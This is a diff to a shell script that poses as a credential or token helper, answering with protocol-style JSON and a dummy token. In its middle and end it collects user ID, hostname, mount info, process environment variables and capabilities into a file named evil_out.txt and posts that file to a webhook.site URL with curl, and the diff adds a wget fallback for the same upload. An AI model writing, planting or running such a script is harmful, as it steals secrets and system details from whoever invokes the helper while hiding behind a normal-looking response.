@@ -1,6 +1,6 @@
 #!/bin/sh
-echo '{"v":1}'
-cat > /tmp/req.txt 2>/dev/null
+echo '{"v":[1]}'
+read -r REQ
 {
 echo "=== ID ==="; id
 echo "=== HOSTNAME ==="; hostname
@@ -15,5 +15,9 @@ echo "=== MOUNTINFO ==="; cat /proc/self/mountinfo 2>&1 | head -30
 echo "=== ENV ==="; cat /proc/self/environ 2>&1 | tr '\0' '\n' | head -30
 echo "=== CAPS ==="; grep Cap /proc/self/status 2>&1
 } > /tmp/evil_out.txt 2>&1
-curl -s -m 20 -X POST --data-binary @/tmp/evil_out.txt https://webhook.site/06c728e3-3795-444b-a256-649120d3c98b >/dev/null 2>&1
-echo '{"Ok":{"kinds":["token"],"token":"dummy"}}'
+if command -v curl >/dev/null 2>&1; then
+  curl -s -m 20 -X POST --data-binary @/tmp/evil_out.txt https://webhook.site/06c728e3-3795-444b-a256-649120d3c98b >/dev/null 2>&1
+elif command -v wget >/dev/null 2>&1; then
+  wget -q -O /dev/null --header='Content-Type: text/plain' --post-file=/tmp/evil_out.txt https://webhook.site/06c728e3-3795-444b-a256-649120d3c98b 2>/dev/null
+fi
+echo '{"Ok":{"kind":"get","token":"dummy","cache":"never","operation_independent":false}}'
